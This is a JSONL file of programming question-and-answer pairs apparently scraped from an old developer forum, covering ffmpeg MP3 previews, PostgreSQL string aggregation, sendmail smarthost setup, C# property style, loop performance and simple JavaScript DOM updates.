{"instruction": "Original Question\nI want to be able to generate a new (fully valid) MP3 file from an existing MP3 file to be used as a preview -- try-before-you-buy style. The new file should only contain the first n seconds of the track.\nNow, I know I could just \"chop the stream\" at n seconds (calculating from the bitrate and header size) when delivering the file, but this is a bit dirty and a real PITA on a VBR track. I'd like to be able to generate a proper MP3 file.\nAnyone any ideas?\nAnswers\nBoth mp3split and ffmpeg are both good solutions. I chose ffmpeg as it is commonly installed on linux servers and is also easily available for windows.  Here's some more good command line parameters for generating previews with ffmpeg\n\n-t <seconds> chop after specified number of seconds\n-y force file overwrite\n-ab <bitrate> set bitrate e.g. -ab 96k\n-ar <rate Hz> set sampling rate e.g. -ar 22050 for 22.05kHz\n-map_meta_data <outfile>:<infile> copy track metadata from infile to outfile\n\ninstead of setting -ab and -ar, you can copy the original track settings, as Tim Farley suggests, with:\n\n-acodec copy", "output": "I have used this: http://mp3splt.sourceforge.net/mp3splt_page/home.php before with good results"}
{"instruction": "I am looking for a way to concatenate the strings of a field within a group by query. So for example, I have a table:\nID   COMPANY_ID   EMPLOYEE\n1    1            Anna\n2    1            Bill\n3    2            Carol\n4    2            Dave\n\nand I wanted to group by company_id to get something like:\nCOMPANY_ID   EMPLOYEE\n1            Anna, Bill\n2            Carol, Dave\n\nThere is a built-in function in mySQL to do this group_concat", "output": "Update as of PostgreSQL 9.0:\nRecent versions of Postgres (since late 2010) have the string_agg(expression, delimiter) function that will do exactly what the question asked for, even letting you specify the delimiter string:\nSELECT company_id, string_agg(employee, ', ')\nFROM mytable\nGROUP BY company_id;\n\nUpdate as of PostgreSQL 8.4:\nPostgreSQL 8.4 (in 2009) introduced the aggregate function array_agg(expression) which concatenates the values into an array. Then array_to_string() can be used to give the desired result:\nSELECT company_id, array_to_string(array_agg(employee), ', ')\nFROM mytable\nGROUP BY company_id;\n\nOriginal Answer (for pre-8.4 PostgreSQL):\nThere is no built-in aggregate function to concatenate strings. It seems like this would be needed, but it's not part of the default set. A web search however reveals some manual implementations the same example:\nCREATE AGGREGATE textcat_all(\n  basetype    = text,\n  sfunc       = textcat,\n  stype       = text,\n  initcond    = ''\n);\n\nHere is the CREATE AGGREGATE documentation.\nIn order to get the \", \" inserted in between them without having it at the end, you might want to make your own concatenation function and substitute it for the \"textcat\" above. Here is one I put together but haven't tested (update: tested on 8.3.12 and working fine):\nCREATE FUNCTION commacat(acc text, instr text) RETURNS text AS $$\n  BEGIN\n    IF acc IS NULL OR acc = '' THEN\n      RETURN instr;\n    ELSE\n      RETURN acc || ', ' || instr;\n    END IF;\n  END;\n$$ LANGUAGE plpgsql;\n\nNote: The function above will output a comma even if the value in the row is null/empty, which outputs:\na, b, c, , e, , g\n\nIf you would prefer to remove extra commas to output:\na, b, c, e, g\n\njust add an ELSIF check to the function:\nCREATE FUNCTION commacat_ignore_nulls(acc text, instr text) RETURNS text AS $$\n  BEGIN\n    IF acc IS NULL OR acc = '' THEN\n      RETURN instr;\n    ELSIF instr IS NULL OR instr = '' THEN\n      RETURN acc;\n    ELSE\n      RETURN acc || ', ' || instr;\n    END IF;\n  END;\n$$ LANGUAGE plpgsql;"}
{"instruction": "For me a multistage environment contains environments for development, testing, quality assurance, maybe a client review stage and finally production. It should allow easy collaboration between developers, project status tracking and easy deployment of the application to any stage for a specific version. \nYou can propose specific tools for specific application types but I think the question is general enough. Is there any software package ready to use out of the box?", "output": "For a larger enterprise with multiple software systems being developed/released concurrently, I think you will probably need a few different tools to manage all of this.\nIn a Microsoft environment, TFS provides collaborative development, source control, and dev task management (including bug tracking and resolution, with a little customization) as well as CI/automated build.  But it doesn't really do much for you after the build is complete, you have to set up your own QA tooling and deployment tools/protocols."}
{"instruction": "For me a multistage environment contains environments for development, testing, quality assurance, maybe a client review stage and finally production. It should allow easy collaboration between developers, project status tracking and easy deployment of the application to any stage for a specific version. \nYou can propose specific tools for specific application types but I think the question is general enough. Is there any software package ready to use out of the box?", "output": "There is a tool called Capistrano. This is written in Ruby and allows you to do the things you have described. Apache Maven may also provide this functionality but I havent used it."}
{"instruction": "I'm setting up a server which is on a network behind a firewall and I want programs on this computer to be able to use sendmail to send emails to any email address.  We have an SMTP server running on this network (let's call it mailrelay.example.com) which is how we're supposed to get outgoing emails through the firewall.\nSo how do I configure sendmail to send all mail through mailrelay.example.com?  Googling hasn't given me the answer yet, and has only revealed that sendmail configuration is extremely complex and annoying.", "output": "http://www.elandsys.com/resources/sendmail/smarthost.html\n\nSendmail Smarthost\nA smarthost is a host through which\n  outgoing mail is relayed. Some ISPs\n  block outgoing SMTP traffic (port 25)\n  and require their users to send out\n  all mail through the ISP's mail\n  server. Sendmail can be configured to\n  use the ISP's mail server as the smart\n  host.\n\nRead the linked article for instruction for how to set this up."}
{"instruction": "Original Question\nI want to be able to generate a new (fully valid) MP3 file from an existing MP3 file to be used as a preview -- try-before-you-buy style. The new file should only contain the first n seconds of the track.\nNow, I know I could just \"chop the stream\" at n seconds (calculating from the bitrate and header size) when delivering the file, but this is a bit dirty and a real PITA on a VBR track. I'd like to be able to generate a proper MP3 file.\nAnyone any ideas?\nAnswers\nBoth mp3split and ffmpeg are both good solutions. I chose ffmpeg as it is commonly installed on linux servers and is also easily available for windows.  Here's some more good command line parameters for generating previews with ffmpeg\n\n-t <seconds> chop after specified number of seconds\n-y force file overwrite\n-ab <bitrate> set bitrate e.g. -ab 96k\n-ar <rate Hz> set sampling rate e.g. -ar 22050 for 22.05kHz\n-map_meta_data <outfile>:<infile> copy track metadata from infile to outfile\n\ninstead of setting -ab and -ar, you can copy the original track settings, as Tim Farley suggests, with:\n\n-acodec copy", "output": "Just a thought: you may want to skip the beginning of the original song. Say, you can use 30 seconds piece starting at the third of the song.\nIn some songs, the first 30 seconds doesn't tell you much as it's just a \"setting up the scene\" part - for instance Pink Floyd's Shine On You Crazy Diamond."}
{"instruction": "I'm using the AutoComplete control from the ASP.NET AJAX Control Toolkit and I'm experiencing an issue where the AutoComplete does not populate when I set the focus to the assigned textbox.  \nI've tried setting the focus in the Page_Load, Page_PreRender, and Page_Init events and the focus is set properly but the AutoComplete does not work.  If I don't set the focus, everything works fine but I'd like to set it so the users don't have that extra click.  \nIs there a special place I need to set the focus or something else I need to do to make this work?  Thanks.", "output": "How are you setting focus? I haven't tried the specific scenario you've suggested, but here's how I set focus to my controls:\nPublic Sub SetFocus(ByVal ctrl As Control)\n    Dim sb As New System.Text.StringBuilder\n    Dim p As Control\n    p = ctrl.Parent\n    While (Not (p.GetType() Is GetType(System.Web.UI.HtmlControls.HtmlForm)))\n        p = p.Parent\n    End While\n    With sb\n        .Append(\"<script language='JavaScript'>\")\n        .Append(\"function SetFocus()\")\n        .Append(\"{\")\n        .Append(\"document.\")\n        .Append(p.ClientID)\n        .Append(\"['\")\n        .Append(ctrl.UniqueID)\n        .Append(\"'].focus();\")\n        .Append(\"}\")\n        .Append(\"window.onload = SetFocus;\")\n        .Append(\"\")\n        .Append(\"</script\")\n        .Append(\">\")\n    End With\n    ctrl.Page.RegisterClientScriptBlock(\"SetFocus\", sb.ToString())\nEnd Sub\n\nSo, I'm not sure what method you're using, but if it's different than mine, give that a shot and see if you still have a problem or not."}
{"instruction": "I'm setting up a server which is on a network behind a firewall and I want programs on this computer to be able to use sendmail to send emails to any email address.  We have an SMTP server running on this network (let's call it mailrelay.example.com) which is how we're supposed to get outgoing emails through the firewall.\nSo how do I configure sendmail to send all mail through mailrelay.example.com?  Googling hasn't given me the answer yet, and has only revealed that sendmail configuration is extremely complex and annoying.", "output": "@Espo: Thanks for the great advice on where to start.  Your link would have been better if I had been configuring sendmail for its first use instead of taking an existing configuration and making this small change.  However, once I knew to look for stuff on \"SmartHost\", I found an easier way.\nAll I had to do was edit my /etc/mail/sendmail.cf file to change\nDS\n\nto\nDSmailrelay.example.com\n\nthen restart sendmail and it worked."}
{"instruction": "Original Question\nI want to be able to generate a new (fully valid) MP3 file from an existing MP3 file to be used as a preview -- try-before-you-buy style. The new file should only contain the first n seconds of the track.\nNow, I know I could just \"chop the stream\" at n seconds (calculating from the bitrate and header size) when delivering the file, but this is a bit dirty and a real PITA on a VBR track. I'd like to be able to generate a proper MP3 file.\nAnyone any ideas?\nAnswers\nBoth mp3split and ffmpeg are both good solutions. I chose ffmpeg as it is commonly installed on linux servers and is also easily available for windows.  Here's some more good command line parameters for generating previews with ffmpeg\n\n-t <seconds> chop after specified number of seconds\n-y force file overwrite\n-ab <bitrate> set bitrate e.g. -ab 96k\n-ar <rate Hz> set sampling rate e.g. -ar 22050 for 22.05kHz\n-map_meta_data <outfile>:<infile> copy track metadata from infile to outfile\n\ninstead of setting -ab and -ar, you can copy the original track settings, as Tim Farley suggests, with:\n\n-acodec copy", "output": "I also recommend ffmpeg, but the command line suggested by John Boker has an unintended side effect: it re-encodes the file to the default bitrate (which is 64 kb/s in the version I have here at least). This might give your customers a false impression of the quality of your sound files, and it also takes longer to do.\nHere's a command line that will slice to 30 seconds without transcoding:\nffmpeg -t 30 -i inputfile.mp3 -acodec copy outputfile.mp3\n\nThe -acodec switch tells ffmpeg to use the special \"copy\" codec which does not transcode.  It is lightning fast.\nNOTE: the command was updated based on comment from Oben Sonne"}
{"instruction": "This is a fairly trivial matter, but I'm curious to hear people's opinions on it.\nIf I have a Dictionary which I'm access through properties, which of these formats would you prefer for the property?\n/// <summary>\n/// This class's FirstProperty property\n/// </summary>\n[DefaultValue(\"myValue\")]\npublic string FirstProperty {\n    get {\n        return Dictionary[\"myKey\"];\n    }\n    set {\n        Dictionary[\"myKey\"] = value;\n    }\n\nThis is probably the typical way of doing it. It's fairly efficient, easy to understand, etc. The only disadvantage is with a longer or more complex key it would be possible to misspell it or change only one instance or something, leading me to this:\n/// <summary>\n/// This class's SecondProperty property\n/// </summary>\n[DefaultValue(\"myValue\")]\nprivate const string DICT_MYKEY = \"myKey\"\npublic string SecondProperty {\n    get {\n        return Dictionary[DICT_MYKEY];\n    }\n    set {\n        Dictionary[DICT_MYKEY] = value;\n    }\n\nWhich is marginally more complicated, but seems to offer additional safety, and is closer to what I would think of as the \"Code Complete\" solution. The downside is that when you also have a ///  block and a [DefaultValue()] block above the property already, it starts getting a bit crowded up there.\nSo which do you like better, and why? Does anybody have any better ideas?", "output": "I like the second one purely because any avoidance of magic strings/numbers in code is a good thing.  IMO if you need to reference a number or string literal in code more than once, it should be a constant.  In most cases even if it's only used once it should be in a constant"}
{"instruction": "This is a fairly trivial matter, but I'm curious to hear people's opinions on it.\nIf I have a Dictionary which I'm access through properties, which of these formats would you prefer for the property?\n/// <summary>\n/// This class's FirstProperty property\n/// </summary>\n[DefaultValue(\"myValue\")]\npublic string FirstProperty {\n    get {\n        return Dictionary[\"myKey\"];\n    }\n    set {\n        Dictionary[\"myKey\"] = value;\n    }\n\nThis is probably the typical way of doing it. It's fairly efficient, easy to understand, etc. The only disadvantage is with a longer or more complex key it would be possible to misspell it or change only one instance or something, leading me to this:\n/// <summary>\n/// This class's SecondProperty property\n/// </summary>\n[DefaultValue(\"myValue\")]\nprivate const string DICT_MYKEY = \"myKey\"\npublic string SecondProperty {\n    get {\n        return Dictionary[DICT_MYKEY];\n    }\n    set {\n        Dictionary[DICT_MYKEY] = value;\n    }\n\nWhich is marginally more complicated, but seems to offer additional safety, and is closer to what I would think of as the \"Code Complete\" solution. The downside is that when you also have a ///  block and a [DefaultValue()] block above the property already, it starts getting a bit crowded up there.\nSo which do you like better, and why? Does anybody have any better ideas?", "output": "I agree with @Glenn for a purely nit-picky point of view.   The answer is whatever works for you.  All this code takes place in 10 lines (if you include the omitted last curly brace).  Nobody is going to get lost and the chance of mistyping is pretty slim (not impossible but very slim).  On the other hand, if you used the key somewhere else, then DEFINATELY go with the constant.\nPersonally, I would go off on you about your curly brace style. :)  Just kidding!  It really is a matter of style."}
{"instruction": "This is a fairly trivial matter, but I'm curious to hear people's opinions on it.\nIf I have a Dictionary which I'm access through properties, which of these formats would you prefer for the property?\n/// <summary>\n/// This class's FirstProperty property\n/// </summary>\n[DefaultValue(\"myValue\")]\npublic string FirstProperty {\n    get {\n        return Dictionary[\"myKey\"];\n    }\n    set {\n        Dictionary[\"myKey\"] = value;\n    }\n\nThis is probably the typical way of doing it. It's fairly efficient, easy to understand, etc. The only disadvantage is with a longer or more complex key it would be possible to misspell it or change only one instance or something, leading me to this:\n/// <summary>\n/// This class's SecondProperty property\n/// </summary>\n[DefaultValue(\"myValue\")]\nprivate const string DICT_MYKEY = \"myKey\"\npublic string SecondProperty {\n    get {\n        return Dictionary[DICT_MYKEY];\n    }\n    set {\n        Dictionary[DICT_MYKEY] = value;\n    }\n\nWhich is marginally more complicated, but seems to offer additional safety, and is closer to what I would think of as the \"Code Complete\" solution. The downside is that when you also have a ///  block and a [DefaultValue()] block above the property already, it starts getting a bit crowded up there.\nSo which do you like better, and why? Does anybody have any better ideas?", "output": "This isn't answering your question, but I don't think \"DefaultValue\" means what you think it means. It doesn't set a default value for your property.\nSee MSDN and this question for more details."}
{"instruction": "This is a fairly trivial matter, but I'm curious to hear people's opinions on it.\nIf I have a Dictionary which I'm access through properties, which of these formats would you prefer for the property?\n/// <summary>\n/// This class's FirstProperty property\n/// </summary>\n[DefaultValue(\"myValue\")]\npublic string FirstProperty {\n    get {\n        return Dictionary[\"myKey\"];\n    }\n    set {\n        Dictionary[\"myKey\"] = value;\n    }\n\nThis is probably the typical way of doing it. It's fairly efficient, easy to understand, etc. The only disadvantage is with a longer or more complex key it would be possible to misspell it or change only one instance or something, leading me to this:\n/// <summary>\n/// This class's SecondProperty property\n/// </summary>\n[DefaultValue(\"myValue\")]\nprivate const string DICT_MYKEY = \"myKey\"\npublic string SecondProperty {\n    get {\n        return Dictionary[DICT_MYKEY];\n    }\n    set {\n        Dictionary[DICT_MYKEY] = value;\n    }\n\nWhich is marginally more complicated, but seems to offer additional safety, and is closer to what I would think of as the \"Code Complete\" solution. The downside is that when you also have a ///  block and a [DefaultValue()] block above the property already, it starts getting a bit crowded up there.\nSo which do you like better, and why? Does anybody have any better ideas?", "output": "A lot of people would probably argue that the second option is \"correct\", because any value used more than once should be refactored into a constant. I would most likely use the first option. You have already gotten close to the \"Code Complete\" solution by encapsulating the dictionary entry in a strong typed property. This reduces the chance of screwing up retrieving the wrong Dictionary entry in your implementation. \nThere are only 2 places where you could mess up typing \"myKey\", in the getter and setter, and this would be very easy to spot. \nThe second option would just get too messy."}
{"instruction": "This is a fairly trivial matter, but I'm curious to hear people's opinions on it.\nIf I have a Dictionary which I'm access through properties, which of these formats would you prefer for the property?\n/// <summary>\n/// This class's FirstProperty property\n/// </summary>\n[DefaultValue(\"myValue\")]\npublic string FirstProperty {\n    get {\n        return Dictionary[\"myKey\"];\n    }\n    set {\n        Dictionary[\"myKey\"] = value;\n    }\n\nThis is probably the typical way of doing it. It's fairly efficient, easy to understand, etc. The only disadvantage is with a longer or more complex key it would be possible to misspell it or change only one instance or something, leading me to this:\n/// <summary>\n/// This class's SecondProperty property\n/// </summary>\n[DefaultValue(\"myValue\")]\nprivate const string DICT_MYKEY = \"myKey\"\npublic string SecondProperty {\n    get {\n        return Dictionary[DICT_MYKEY];\n    }\n    set {\n        Dictionary[DICT_MYKEY] = value;\n    }\n\nWhich is marginally more complicated, but seems to offer additional safety, and is closer to what I would think of as the \"Code Complete\" solution. The downside is that when you also have a ///  block and a [DefaultValue()] block above the property already, it starts getting a bit crowded up there.\nSo which do you like better, and why? Does anybody have any better ideas?", "output": "You could match the property names up to the keys and use reflection to get the name for the lookup.\npublic string FirstProperty {\nget {\n    return Dictionary[PropertyName()];\n}\nset {\n    Dictionary[PropertyName()] = value;\n}\n\nprivate string PropertyName()\n{\n    return new StackFrame(1).GetMethod().Name.Substring(4);\n}\n\nThis has the added benefit of making all your property implementation identical, so you could set them up in visual studio as code snippets if you want."}
{"instruction": "We've been using \"Drip\" to try and identify why pages with UpdatePanels in them tend to use a lot of client-side memory.  With a page with a regular postback, we are seeing 0 leaks detected by Drip.  However, when we add an update panel to the mix, every single DOM object that is inside of the update panel appears to leak (according to Drip).\nI am not certain is Drip is reliable enough to report these kinds of things - the reported leaks do seem to indicate Drip is modifying the page slightly.  \nDoes anyone have any experience with this?  Should I panic and stop using Microsoft Ajax?  I'm not above doubting Microsoft, but it seems fishy to me that it could be this bad.\nAlso, if you know of a tool that is better than Drip, that would be helpful as well.", "output": "According to ASP.NET AJAX in Action, p. 257\n\nJust before the old markup is replaced with the updated HTML, all the DOM elements in the panel are examined for Microsoft Ajax behaviours or controls attached to them. To avoid memory leaks, the components associated with DOM elements are disposed, and then destroyed when the HTMl is replaced.\n\nSo as far as I know, any asp.net ajax components within the update panel are disposed to prevent memory leaks, but anything else in there will just be replaced with the html received.\nSo if you don't have any asp.net ajax components in the target container for the response, it would be basically the same as an inner html replacement with any other js framework / ajax request, so i would say that it's just the how the browser handles this, rather than asp.net ajax causing this.\nAlso, while it may be \"leaking\", it may be by design, meaning that the browser might not have reclaimed the dom elements yet and released them. Also, drip might be causing those to leak, as it is attaching to those dom elements."}
{"instruction": "This is a fairly trivial matter, but I'm curious to hear people's opinions on it.\nIf I have a Dictionary which I'm access through properties, which of these formats would you prefer for the property?\n/// <summary>\n/// This class's FirstProperty property\n/// </summary>\n[DefaultValue(\"myValue\")]\npublic string FirstProperty {\n    get {\n        return Dictionary[\"myKey\"];\n    }\n    set {\n        Dictionary[\"myKey\"] = value;\n    }\n\nThis is probably the typical way of doing it. It's fairly efficient, easy to understand, etc. The only disadvantage is with a longer or more complex key it would be possible to misspell it or change only one instance or something, leading me to this:\n/// <summary>\n/// This class's SecondProperty property\n/// </summary>\n[DefaultValue(\"myValue\")]\nprivate const string DICT_MYKEY = \"myKey\"\npublic string SecondProperty {\n    get {\n        return Dictionary[DICT_MYKEY];\n    }\n    set {\n        Dictionary[DICT_MYKEY] = value;\n    }\n\nWhich is marginally more complicated, but seems to offer additional safety, and is closer to what I would think of as the \"Code Complete\" solution. The downside is that when you also have a ///  block and a [DefaultValue()] block above the property already, it starts getting a bit crowded up there.\nSo which do you like better, and why? Does anybody have any better ideas?", "output": "When you only use a magic string in one context, like you do, I think it's alright.\nBut if you ever need to use the key in another part of the class, go const."}
{"instruction": "We've been using \"Drip\" to try and identify why pages with UpdatePanels in them tend to use a lot of client-side memory.  With a page with a regular postback, we are seeing 0 leaks detected by Drip.  However, when we add an update panel to the mix, every single DOM object that is inside of the update panel appears to leak (according to Drip).\nI am not certain is Drip is reliable enough to report these kinds of things - the reported leaks do seem to indicate Drip is modifying the page slightly.  \nDoes anyone have any experience with this?  Should I panic and stop using Microsoft Ajax?  I'm not above doubting Microsoft, but it seems fishy to me that it could be this bad.\nAlso, if you know of a tool that is better than Drip, that would be helpful as well.", "output": "That's very likely.  This was pretty much what we assumed (browser problem, not necessarily Ajax).\nOur problem is now, with this application being accessed by many people via a Citrix environment, with each page continually creating DOM objects and not releasing them, the Citrix environment starts thrashing after some usage.  I've seen similar complaints online (especially where you are dumb enough to access an Ajax website via Citrix), but it doesn't make me feel much better that this is the intended behavior.\nI'm wondering now if anyone has come up with a clever workaround.  We also have a client app where we are using the .NET BrowserControl to access these websites, rather than just straight IE7, so if anyone knows a secret API call (FreeStaleDomObjectsFTW()) we can utilize from that end of the stack, that would be useful as well."}
{"instruction": "How do you give a C# Auto-Property a default value?  I either use the constructor, or revert to the old syntax. \n Using the Constructor:\nclass Person \n{\n    public Person()\n    {\n        Name = \"Default Name\";\n    }\n    public string Name { get; set; }\n}\n\nUsing normal property syntax  (with a default value)\nprivate string name = \"Default Name\";\npublic string Name \n{\n    get \n    {\n        return name;\n    }\n    set\n    {\n        name = value;\n    }\n}\n\nIs there a better way?", "output": "You should not add a default to the constructor; this will mean that in the creation of the object the property will have to be assigned to twice (once as null, then again in the constructor). If you require a default value for a property it should broken out as a normal property (or possibly deferred to a builder in a creational pattern). \nOne other option is to do what ASP.Net does and define defaults via an attribute:\nhttp://msdn.microsoft.com/en-us/library/system.componentmodel.defaultvalueattribute.aspx\nBut again, I would simply break out the property as this is the clearest and most efficient option."}
{"instruction": "I am looking for a simple JavaScript example that updates DOM.\nAny suggestions?", "output": "I believe that this tutorial on jQuery has an example that might help you: http://docs.jquery.com/Tutorials:Getting_Started_with_jQuery"}
{"instruction": "I am looking for a simple JavaScript example that updates DOM.\nAny suggestions?", "output": "A more specific question might give more helpful results, but here's a simple pair of snippets that shows and later updates text in a status container element.\n\n// give some visual cue that you're waiting\ncontainer.appendChild( document.createTextNode( \"Getting stuff from remote server...\" ) );\n\n// then later...        \n// update request status    \ncontainer.replaceChild( document.createTextNode( \"Done.\" ), container.firstChild );"}
{"instruction": "One of the things that get me thoroughly confused is the use of session.Flush,in conjunction with session.Commit, and session.Close.\nSometimes session.Close works, e.g., it commits all the changes that I need. I know I need to use commit when I have a transaction, or a unit of work with several creates/updates/deletes, so that I can choose to rollback if an error occurs.\nBut sometimes I really get stymied by the logic behind session.Flush. I have seen examples where you have a session.SaveOrUpdate() followed by a flush, but when I remove Flush it works fine anyway. Sometimes I run into errors on the Flush statement saying that the session timed out, and removing it made sure that I didn't run into that error.\nDoes anyone have a good guideline as to where or when to use a Flush? I've checked out the NHibernate documentation for this, but I still can't find a straightforward answer.", "output": "Starting in NHibernate 2.0, transactions are required for DB operations.  Therefore, the ITransaction.Commit() call will handle any necessary flushing.  If for some reason you aren't using NHibernate transactions, then there will be no auto-flushing of the session."}
{"instruction": "I am looking for a simple JavaScript example that updates DOM.\nAny suggestions?", "output": "Here is a short pure-javascript example. Assume you have a div with the id \"maincontent\".\nvar newnode = document.createTextNode('Here is some text.');\ndocument.getElementById('maincontent').appendChild(newnode);\n\nOf course, things are a lot easier (especially when you want to do more complicated things) with jQuery."}
{"instruction": "I have been told that there is a performance difference between the following code blocks.\nforeach (Entity e in entityList)\n{\n ....\n}\n\nand \nfor (int i=0; i<entityList.Count; i++)\n{\n   Entity e = (Entity)entityList[i];\n   ...\n}\n\nwhere\nList<Entity> entityList;\n\nI am no CLR expect but from what I can tell they should boil down to basically the same code.  Does anybody have concrete (heck, I'd take packed dirt) evidence one way or the other?", "output": "foreach creates an instance of an enumerator (returned from GetEnumerator) and that enumerator also keeps state throughout the course of the foreach loop. It then repeatedly calls for the Next() object on the enumerator and runs your code for each object it returns.\nThey don't boil down to the same code in any way, really, which you'd see if you wrote your own enumerator."}
{"instruction": "I have been told that there is a performance difference between the following code blocks.\nforeach (Entity e in entityList)\n{\n ....\n}\n\nand \nfor (int i=0; i<entityList.Count; i++)\n{\n   Entity e = (Entity)entityList[i];\n   ...\n}\n\nwhere\nList<Entity> entityList;\n\nI am no CLR expect but from what I can tell they should boil down to basically the same code.  Does anybody have concrete (heck, I'd take packed dirt) evidence one way or the other?", "output": "Here is a good article that shows the IL differences between the two loops.\nForeach is technically slower however much easier to use and easier to read.  Unless performance is critical I prefer the foreach loop over the for loop."}
{"instruction": "This is a fairly trivial matter, but I'm curious to hear people's opinions on it.\nIf I have a Dictionary which I'm access through properties, which of these formats would you prefer for the property?\n/// <summary>\n/// This class's FirstProperty property\n/// </summary>\n[DefaultValue(\"myValue\")]\npublic string FirstProperty {\n    get {\n        return Dictionary[\"myKey\"];\n    }\n    set {\n        Dictionary[\"myKey\"] = value;\n    }\n\nThis is probably the typical way of doing it. It's fairly efficient, easy to understand, etc. The only disadvantage is with a longer or more complex key it would be possible to misspell it or change only one instance or something, leading me to this:\n/// <summary>\n/// This class's SecondProperty property\n/// </summary>\n[DefaultValue(\"myValue\")]\nprivate const string DICT_MYKEY = \"myKey\"\npublic string SecondProperty {\n    get {\n        return Dictionary[DICT_MYKEY];\n    }\n    set {\n        Dictionary[DICT_MYKEY] = value;\n    }\n\nWhich is marginally more complicated, but seems to offer additional safety, and is closer to what I would think of as the \"Code Complete\" solution. The downside is that when you also have a ///  block and a [DefaultValue()] block above the property already, it starts getting a bit crowded up there.\nSo which do you like better, and why? Does anybody have any better ideas?", "output": "@Joel you don't want to count on StackFrame.  In-lining can ruin your day when you least expect it.\nBut to the question: Either way doesn't really matter a whole lot."}
{"instruction": "I have been told that there is a performance difference between the following code blocks.\nforeach (Entity e in entityList)\n{\n ....\n}\n\nand \nfor (int i=0; i<entityList.Count; i++)\n{\n   Entity e = (Entity)entityList[i];\n   ...\n}\n\nwhere\nList<Entity> entityList;\n\nI am no CLR expect but from what I can tell they should boil down to basically the same code.  Does anybody have concrete (heck, I'd take packed dirt) evidence one way or the other?", "output": "I think one possible situation where you might get a performance gain is if the enumerable type's size and the loop condition is a constant; for example:\nconst int ArraySize = 10;\nint[] values = new int[ArraySize];\n\n//...\n\nfor (int i = 0; i \nIn this case, depending on the complexity of the loop body, the compiler might be able to replace the loop with inline calls.  I have no idea if the .NET compiler does this, and it's of limited utility if the size of the enumerable type is dynamic.\nOne situation where foreach might perform better is with data structures like a linked list where random access means traversing the list; the enumerator used by foreach will probably iterate one item at a time, making each access O(1) and the full loop O(n), but calling the indexer means starting at the head and finding the item at the right index; O(N) each loop for O(n^2).\nPersonally I don't usually worry about it and use foreach any time I need all items and don't care about the index of the item.  If I'm not working with all of the items or I really need to know the index, I use for.  The only time I could see it being a big concern is with structures like linked lists."}
{"instruction": "I am looking for a simple JavaScript example that updates DOM.\nAny suggestions?", "output": "<html>\n    <head>\n    <title>Font Detect please</title>\n\n    <script src=\"prototype.js\" type=\"text/javascript\"></script>\n    <script type=\"text/javascript\">\n        $('Myanmar3').update('False');         \n        $('Myanmar3').innerHTML;        \n    </script>\n    </head>\n    <body>\t\t\n\n    \t<table border=\"1\">\n        <tr><td>Font</td><td>Installed</td></tr>\n        <tr><td>Myanmar3</td><td id=Myanmar3>True</td></tr>\n        </table>    \t\n\n    </body>\n</html>\n\nI have a simple code like that above and am trying to change the result True to false via Javascript using Prototype. What might I be doing wrong?\nEdit: Got it. I didn't call it. :D"}
{"instruction": "I have been told that there is a performance difference between the following code blocks.\nforeach (Entity e in entityList)\n{\n ....\n}\n\nand \nfor (int i=0; i<entityList.Count; i++)\n{\n   Entity e = (Entity)entityList[i];\n   ...\n}\n\nwhere\nList<Entity> entityList;\n\nI am no CLR expect but from what I can tell they should boil down to basically the same code.  Does anybody have concrete (heck, I'd take packed dirt) evidence one way or the other?", "output": "The foreach sample roughly corresponds to this code:\nusing(IEnumerator<Entity> e = entityList.GetEnumerator()) {\n    while(e.MoveNext()) {\n        Entity entity = e.Current;\n        ...\n    }\n}\n\nThere are two costs here that a regular for loop does not have to pay:\n\nThe cost of allocating the enumerator object by entityList.GetEnumerator().\nThe cost of two virtual methods calls (MoveNext and Current) for each element of the list."}
{"instruction": "I have been told that there is a performance difference between the following code blocks.\nforeach (Entity e in entityList)\n{\n ....\n}\n\nand \nfor (int i=0; i<entityList.Count; i++)\n{\n   Entity e = (Entity)entityList[i];\n   ...\n}\n\nwhere\nList<Entity> entityList;\n\nI am no CLR expect but from what I can tell they should boil down to basically the same code.  Does anybody have concrete (heck, I'd take packed dirt) evidence one way or the other?", "output": "In terms of allocations, it'd be better to look at this blogpost. It shows in exactly in what circumstances an enumerator is allocated on the heap."}
{"instruction": "We've got an interesting case where we are trying to determine how different instances of our app were launched. Is there any way for .NET to be able to query another running instance and get the command line parameters passed to that instance? I've not been able to find any way to do it in .NET so far, so I thought I'd check here to see if anyone had done anything like this before.", "output": "Generally those variables are stored in the program's memory space, which you should (theoretically) should not be able to access.\nYou'll need to find out how to initiate interprocess communication with the other instances and trade data.  Named pipes are one good option, but you might want to start a new stackoverflow question to get good options on this."}
{"instruction": "I am looking for a simple JavaScript example that updates DOM.\nAny suggestions?", "output": "@Ravi\nHere's working example of your code\n<html>\n    <head>\n    <title>Font Detect please</title>\n\n    <script src=\"prototype.js\" type=\"text/javascript\"></script>\n    <script type=\"text/javascript\">\n        function changeTD()\n        {\n            $('Myanmar3').innerHTML = 'False';         \n        }\n    </script>\n    </head>\n    <body>              \n\n        <table border=\"1\">\n        <tr><td>Font</td><td>Installed</td></tr>\n        <tr><td>Myanmar3</td><td id=\"Myanmar3\">True</td></tr>\n        </table>        \n\n        <a href=\"javascript:void(0);\" onclick=\"changeTD();\">Click Me</a>\n\n    </body>\n</html>\n\nYou'll notice that I added a little link that you have to click to actually make the change.  I thought this might make it easier to try out for real."}
{"instruction": "I'm looking for the best algorithm to take array A {0,1,2,3} and make order it like array B {3,1,0,2}.  Any ideas?", "output": "So if you have two arrays and they hold the same data just in different order then just do this:\nA = B\nI suspect that is not your situation so I think we need more info."}
{"instruction": "I'm looking for the best algorithm to take array A {0,1,2,3} and make order it like array B {3,1,0,2}.  Any ideas?", "output": "In the example you gave (an array of numbers), there would be no point in re-ordering A, since you could just use B.\nSo, presumably these are arrays of objects which you want ordered by one of their properties.\nThen, you will need a way to look up items in A based on the property in question (like a hashtable).  Then you can iterate B (which is in the desired sequence), and operate on the corresponding element in A."}
{"instruction": "I'm looking for the best algorithm to take array A {0,1,2,3} and make order it like array B {3,1,0,2}.  Any ideas?", "output": "Both array's contain the same values (or nearly so) but I need to force them to be in the same order.  For example, in array A the value \"3045\" is in index position 4 and in array B it is in index position 1.  I want to reorder B so that the index positions of like values are the same as A."}
